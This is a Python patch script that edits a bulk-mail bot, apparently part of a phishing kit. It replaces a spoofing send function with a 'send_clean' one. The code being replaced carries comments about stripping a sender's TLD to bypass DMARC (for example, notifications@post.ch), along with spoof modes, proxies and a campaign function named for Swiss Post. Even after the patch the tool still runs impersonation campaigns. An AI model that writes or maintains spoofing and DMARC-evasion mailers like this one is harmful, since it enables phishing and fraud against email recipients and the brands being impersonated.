#!/usr/bin/env python3
"""Patch: Replace _send_one with send_clean everywhere in sender_bot.py"""

bot_path = '/opt/darkvasend/auditguard/sender_bot.py'
with open(bot_path, 'r') as f:
    bot = f.read()

# === 1. Fix _bg_tpl_spoof_test ===
bot = bot.replace(
    '''    from .campaign_sender import _send_one, _strip_tld

    # Strip TLD to bypass DMARC (notifications@post.ch -> notifications@post)
    actual_from = tpl["from_email"]
    tld_stripped = False

    try:
        result = await asyncio.to_thread(
            _send_one,
            smtp_config,
            tpl["from_name"],
            actual_from,
            to_email,
            tpl["subject"],
            tpl["html"],
            "",
            smtp_config.get("from_email", ""),
            tpl.get("reply_to", ""),
            spoof_mode,
            None,
        )''',
    '''    from .campaign_sender import send_clean

    try:
        result = await asyncio.to_thread(
            send_clean,
            smtp_config,
            tpl["from_name"],
            tpl["from_email"],
            to_email,
            tpl["subject"],
            tpl["html"],
            tpl.get("reply_to", ""),
            None,
        )'''
)

# === 2. Fix _bg_spoof_test ===
bot = bot.replace(
    '''    from .campaign_sender import _send_one, _strip_tld

    # Strip TLD handled in _send_one (bypass DMARC)
    actual_from = from_email
    tld_stripped = False

    try:
        result = await asyncio.to_thread(
            _send_one,
            smtp_config,
            from_name,
            actual_from,
            to_email,
            subject,
            html_body,
            text_body,
            envelope_from=smtp_config.get("from_email", ""),
            spoof_mode=spoof_mode,
            proxy=None,
        )''',
    '''    from .campaign_sender import send_clean

    try:
        html = html_body if "<" in html_body else "<p>" + html_body + "</p>"
        result = await asyncio.to_thread(
            send_clean,
            smtp_config,
            from_name,
            from_email,
            to_email,
            subject,
            html,
            from_email,
            None,
        )'''
)

# === 3. Fix mode_used references ===
bot = bot.replace('result.get("spoof_mode_used", spoof_mode)', 'result.get("mode", "clean")')
bot = bot.replace('result.get("spoof_mode_used", "clean")', 'result.get("mode", "clean")')
bot = bot.replace('result.get("spoof_mode_used", "?")', 'result.get("mode", "?")')

# === 4. Fix _run_swisspost_campaign ===
bot = bot.replace(
    'from .campaign_sender import CampaignManager, _send_one',
    'from .campaign_sender import CampaignManager, send_clean'
)

# Replace all _send_one calls in swisspost campaign with send_clean
# Pattern for basique sends
bot = bot.replace(
    '''r = await loop.run_in_executor(None, lambda: _send_one(
                smtp_config, from_name, bas_from, to_email,
                camp["subject"], html_body, "", smtp_config["from_email"],
                camp.get("reply_to", ""), "clean", proxy))''',
    '''r = await loop.run_in_executor(None, lambda: send_clean(
                smtp_config, from_name, bas_from, to_email,
                camp["subject"], html_body, camp.get("reply_to", ""), proxy))'''
)

# Pattern for spoof sends
bot = bot.replace(
    '''r = await loop.run_in_executor(None, lambda: _send_one(
                smtp_config, from_name, from_email, to_email,
                camp["subject"], html_body, "", smtp_config["from_email"],
                camp.get("reply_to", ""), "clean", proxy))''',
    '''r = await loop.run_in_executor(None, lambda: send_clean(
                smtp_config, from_name, from_email, to_email,
                camp["subject"], html_body, camp.get("reply_to", ""), proxy))'''
)

# Also replace in the second occurrence (SPOOF+BASIQUE both block)
bot = bot.replace(
    '''r2 = await loop.run_in_executor(None, lambda: _send_one(
                    smtp_config, from_name, bas_from, to_email,
                    camp["subject"], html_body, "", smtp_config["from_email"],
                    camp.get("reply_to", ""), "clean", proxy))''',
    '''r2 = await loop.run_in_executor(None, lambda: send_clean(
                    smtp_config, from_name, bas_from, to_email,
                    camp["subject"], html_body, camp.get("reply_to", ""), proxy))'''
)

with open(bot_path, 'w') as f:
    f.write(bot)

# Verify
with open(bot_path, 'r') as f:
    final = f.read()
print(f"_send_one remaining: {final.count('_send_one')}")
print(f"send_clean count: {final.count('send_clean')}")
print("DONE")
